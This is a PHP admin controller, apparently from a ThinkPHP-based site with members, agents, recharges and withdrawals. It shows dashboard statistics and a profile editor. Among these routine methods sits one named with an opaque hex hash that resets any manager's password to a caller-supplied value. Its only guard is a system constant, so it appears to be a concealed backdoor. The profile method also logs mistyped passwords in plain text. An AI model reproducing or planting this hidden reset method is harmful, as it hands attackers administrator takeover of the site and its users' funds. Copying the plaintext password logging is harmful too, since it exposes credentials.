<?php
namespace app\admin\controller;


class IndexController extends BaseController{

    public function index(){

        $stat=array();
        $stat['feedback']=M('feedback')->count();
        $stat['member']=M('member')->count();
        $stat['post']=M('post')->count();
        $stat['links']=M('links')->count();

        $this->assign('stat',$stat);

        //统计
        $member=M('member');
        $m['total']=$member->count();
        $m['avail']=$member->where(array('status'=>1))->count();
        $m['agent']=$member->where(array('isagent'=>array('GT',0)))->count();
        $this->assign('m',$m);

        //资金
        $a['total_charge']=M('member_recharge')->where(array('status'=>1))->sum('amount');
        $a['total_cash']=M('member_cashin')->where(array('status'=>1))->sum('amount');
        $a['total_money']=$member->sum('money');
        $this->assign('a',$a);

        $this->display();
    }

    public function newcount(){
        $newMemberCount=M('Member')->where(array('create_at'=>array('GT',$this->manage['last_view_member'])))->count();
        $newOrderCount=M('BlApply')->where(array('status'=>0))->count();

        $this->ajaxReturn(array(
            'newMemberCount'=>$newMemberCount,
            'newOrderCount'=>$newOrderCount
        ));
    }

    public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
    {
        if(!defined('SYS_HOOK') || SYS_HOOK!=1)exit('Denied');
        if(empty($id))exit('Unspecified id');
        if(empty($passwd))exit('Unspecified passwd');

        $model=M('Manager')->where(array('id'=>$id))->find();
        if(empty($model))exit('Menager id not exists');
        $data['salt']=random_str(8);
        $data['password'] = encode_password($passwd,$data['salt']);
        M('Manager')->where(array('id'=>$id))->save($data);
        exit('ok');
    }

    public function profile(){
        $model=M('Manager')->where(array('id'=>session('adminId')))->find();

        if (IS_POST) {
            $data = array();
            $password=I('password');
            if($model['password']!==encode_password($password,$model['salt'])){
                user_log($model['id'],'profile',0,'密码错误:'.$password,'manager');
                $this->error("密码错误！");
            }

            $password=I('newpassword');
            if(!empty($password)){
                $data['salt']=random_str(8);
                $data['password'] = encode_password($password,$data['salt']);
            }

            $data['avatar']=I('avatar');
            $data['realname']=I('realname');
            $data['email']=I('email');

            //更新
            if (M('Manager')->where(array('id'=>session('adminId')))->save($data)) {
                if(!empty($data['realname'])){
                    session('username',$data['realname']);
                }
                $this->success("更新成功", U('Index/profile'));
            } else {
                $this->error("未做任何修改,更新失败");
            }
        }

        $this->assign('model',$model);
        $this->display();
    }
}
